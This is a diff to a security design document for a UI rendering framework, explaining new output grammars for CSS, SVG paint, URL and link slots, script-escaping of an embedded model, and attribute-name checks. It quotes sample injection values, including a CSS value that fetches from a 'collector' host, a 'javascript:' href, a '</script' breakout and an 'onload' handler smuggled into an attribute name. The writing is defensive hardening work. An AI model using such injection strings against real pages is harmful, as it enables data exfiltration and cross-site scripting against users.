@@ -366,13 +366,131 @@ The validator does NOT walk the typed tree's record-with bypass (`{ node with Ex
   survive intact, while every real spelling of `<meta>` / `<link>` / `<script>` / `<iframe>`, and a
   truncated open tag at end of input, are still refused.
 
+## The emission grammar for string-typed slots (Phase 1523)
+
+A handful of wire slots are typed `string` and carry a grammar the type does not state: a CSS
+track-list (`LayoutMode.Grid.templateColumns`), a CSS colour or paint (`DrawStyle.fill` / `.stroke`),
+a raw CSS value (a theme's `ColorVar.CssRaw`), a URL (`Link.href`, `Image.src`, `Action.Navigate`'s
+route), and the two anchor token slots (`Link.target`, `Link.rel`). Nothing about `string` says which
+of those a value is, so nothing about `string` refuses a value that is the wrong one.
+
+Until this phase each rule lived at its own EMISSION SITE, per renderer, per arm, by hand. Two
+consequences followed and both were observed.
+
+**The hosts disagreed.** Four server renderers concatenated `templateColumns` into
+`style="grid-template-columns:…"` with no rule at all, while the React client assigned a style
+OBJECT — where the browser silently drops an invalid value. So
+`"1fr;background:url(https://collector/?d=…)"` closed the declaration, opened a second one the
+document never wrote, and fetched on RENDER, with no user act, outside the egress policy that governs
+every `href` and `src` in the same document; and it did nothing at all in the client. A tree vetted
+on one host was not safe on another, which is the one property the wire format exists to provide.
+
+**The refusal was invisible.** A rule applied at render time runs after decode, after `validate`,
+after the op-stream persisted the tree and after the AI-tools surface introspected it. A model that
+emitted a `javascript:` href was told nothing, the demand loop counted nothing, and a HEADLESS
+consumer — one that decodes and persists without ever rendering — met no floor whatsoever.
+
+So the grammar is declared ONCE, in
+[`src/Fuaran.UI/EmissionGrammar.fs`](src/Fuaran.UI/EmissionGrammar.fs), beside `WireLimits` and for
+the same reason: it is a PROTOCOL rule, not a renderer implementation detail. `PreEmitValidate`
+consults it (FUARAN142–146, so the emitter sees the refusal), `Renderer.Core.Sanitize` re-exports it
+under its established names (so a decoded tree that never met the pre-emit pass still meets the
+floor, and no emission site's call had to be renamed), and the py / go / rs / ts hosts carry a copy
+of the same rule verified by their own corpora.
+
+### The rules, and why two are denylists and three are allowlists
+
+- **CSS value — a character denylist** (`;`, `{`, `}`, `\`, C0/DEL) plus two functions refused by
+  name (`url(`, `expression(`). A CSS value's grammar is genuinely open — the property set grows, the
+  function set grows, and a positive list would refuse `clamp()` the day CSS shipped it — while the
+  set of characters that let a value LEAVE its declaration is small, stable and enumerable. The
+  backslash is CSS's own escape introducer, so refusing it is what makes the rest of the list total.
+  **What it does not promise:** it is not a CSS parser, and says nothing about whether the surviving
+  string is a VALID value. An invalid value is dropped by the browser's own parser — a rendering
+  defect, not a security one. Applied to `templateColumns` at every grid arm and to
+  `ColorVar.CssRaw`, whose output lands in a `:root { … }` block inside a `<style>` element.
+- **SVG paint — a closed colour grammar** (`#rgb` / `#rrggbb` / `#rrggbbaa`, a bare CSS ident, or a
+  call to one of the named colour functions). A paint slot needs a POSITIVE grammar where a generic
+  CSS value does not, and that asymmetry is the finding: `url(https://collector/x)` contains no
+  forbidden character, and in an SVG `fill` it names a paint server the user agent FETCHES. A refused
+  paint emits `"none"` rather than an empty value, because an EMPTY `fill` inherits the enclosing
+  group's paint instead of clearing it. The ident arm is what admits every named colour: enumerating
+  keywords instead refuses `steelblue`, and that failure mode is silent — the shape is repainted, not
+  reported — while an ident can neither fetch nor leave its declaration.
+- **URL scheme — an allowlist**, moved here from the renderer so a headless consumer meets it.
+  Unchanged in what it admits; what changed is where it can be consulted.
+- **`Link.target` — closed to `_self` / `_blank`.** `_parent` and `_top` are meaningful only when the
+  document is FRAMED, and a framed Fuaran document navigating its embedder is frame-busting the
+  embedding host did not consent to; a NAMED frame addresses a browsing context by name, so a decoded
+  tree can navigate a window it did not create and whose contents it cannot see. An unrecognised
+  value is OMITTED rather than degraded to `_self`: the two are the same navigation, and omitting says
+  truthfully that the document declared nothing this renderer could honour.
+- **`Link.rel` — a closed token set, with `noopener noreferrer` FORCED on `_blank`.** The one
+  deliberate absence is `opener`, which re-enables `window.opener` on a `_blank` link, handing the
+  opened document a live reference to the opening one. Browsers imply `noopener` there, which is
+  exactly why the omission was dangerous rather than untidy: the behaviour is a user-agent DEFAULT,
+  an explicit `rel="opener"` overrides it, and no document can know its reader's version floor.
+  Emitting the tokens makes the property a fact about the document rather than about the user agent.
+  The result is ORDERED — surviving declared tokens first, then the forced pair — so two hosts given
+  one document emit one byte sequence.
+
+**The WIRE is not narrowed.** No decoder refuses a `target` or `rel` it accepted before; what changed
+is what every renderer EMITS. Narrowing the wire is a §4b amendment carried as a proposal —
+[`docs/proposals/link-target-rel-narrowing.md`](docs/proposals/link-target-rel-narrowing.md) — with
+its reject vectors written out there rather than added to the shared corpus, because a corpus vector
+that every conformant host currently accepts would fail every host on the day it landed.
+
+### The refusal is marked in the document
+
+A refused CSS value emits `data-fuaran-css-refused="<slot>"` on the element that carried it, so the
+refusal is visible in the DOM rather than only in a log — the posture `data-fuaran-egress-refused`
+already keeps. The marker carries the SLOT name and never the value, for the reason the egress marker
+gives: a refused value is the payload.
+
+## The resume envelope's model is script-escaped unconditionally (Phase 1523)
+
+`Renderer.Server/Resume.fs`'s `encodeEnvelope` embedded the host-supplied `modelJson` verbatim, on the
+reasoning that the host owns its own escaping. A host serialising its own model does own its JSON —
+but nothing about correct JSON keeps a string value from containing `</script`, and this string is
+spliced inside a `<script>` element, where the HTML parser looks for that sequence BEFORE any JSON
+parser sees the content. A model carrying it in any string field terminated the block and put the
+remainder of the envelope into the document as markup: an injection whose source is whatever data the
+host happened to serialise, which on a user-content-bearing model is user input.
+
+It is now escaped with the module's own `<` / `>` / `&` rewritten to their JSON unicode escapes,
+unconditionally, exactly as every other value the envelope embeds already was. The escape is sound
+for the same reason it is sound elsewhere: those three characters occur in JSON only inside string
+literals, and every JSON parser reads the escapes back as the characters they name — so the
+structured data is unchanged and only the HTML parser is disarmed.
+
+## `DocumentShell` attribute NAMES (Phase 1523, the 788 class ported)
+
+`Fuaran.UI.Giraffe`'s `Document.render` builds the `<html>` and `<body>` open tags by string
+concatenation rather than through ViewEngine, so the attribute-name gate the rest of the renderer
+gets for free had to be applied by hand — and was not. The VALUE side was escaped; the NAME was
+written verbatim, and HTML has no escape for an illegal character in an attribute name: a space
+inside one simply starts a NEW attribute and an `=` starts its value. A `HtmlAttributes` key of
+`data-x=1 onload=alert(1) z` was therefore not a mangled name but three attributes, one of them a
+live event handler, on the document's own `<html>` element. Names now pass `Sanitize.isSafeAttributeName`
+and a failing one is DROPPED — the only correct response, because there is nothing to escape to: a
+dropped attribute is a missing attribute, which is visible, where a mangled one would be a different
+attribute, which is not.
+
+**What this rule is not.** It is the structural class, not an event-handler denylist. These two
+attribute bags are HOST-authored rather than tree-authored, so a host that writes `onclick` on its
+own `<body>` has written the script it wanted. The TREE-authored bag is a different seam with a
+stricter rule (`isAllowedExtraAttributeKey`: `data-*` and `aria-*` only).
+
 ## Reference
 
+- [`src/Fuaran.UI/EmissionGrammar.fs`](src/Fuaran.UI/EmissionGrammar.fs) — the emission grammar for string-typed slots (Phase 1523): the rule every host's copy agrees with, consulted pre-emit and re-exported at every emission site.
 - [`src/Fuaran.UI.Renderer.Core/Sanitize.fs`](src/Fuaran.UI.Renderer.Core/Sanitize.fs) — implementation (shared by the client and server renderers).
 - [`src/Fuaran.UI.Renderer/TrustedTypes.fs`](src/Fuaran.UI.Renderer/TrustedTypes.fs) — the `fuaran-renderer` Trusted Types policy every client raw-HTML sink mints through.
 - [`src/Fuaran.UI.Tests/SanitizeTests.fs`](src/Fuaran.UI.Tests/SanitizeTests.fs) — XSS-payload corpus.
 - [`src/Fuaran.UI.Tests/TrustedTypesTests.fs`](src/Fuaran.UI.Tests/TrustedTypesTests.fs) — the sink-inventory scan, the floor's invariance over the renderer's own payloads, and the tag-name-boundary cases.
 - [`src/Fuaran.UI.Renderer.Server.Tests/ServerRenderTests.fs`](src/Fuaran.UI.Renderer.Server.Tests/ServerRenderTests.fs) — SSR attribute-name-injection assertions on the emitted HTML string.
+- [`src/Fuaran.UI.Renderer.Server.Tests/EmissionGrammarRenderTests.fs`](src/Fuaran.UI.Renderer.Server.Tests/EmissionGrammarRenderTests.fs) — the emission grammar in emitted bytes, each refusal with its allow twin.
+- [`docs/proposals/link-target-rel-narrowing.md`](docs/proposals/link-target-rel-narrowing.md) — the §4b amendment proposal for narrowing `Link.target` / `Link.rel` on the WIRE.
 - [`STABILITY.md`](STABILITY.md) — language-tier stability policy (which surfaces are stable).
 - [`docs/VALIDATOR-MANIFEST.md`](docs/VALIDATOR-MANIFEST.md) — validator codes including FUARAN060.
 - [`CLAUDE.md`](CLAUDE.md) — repo conventions.
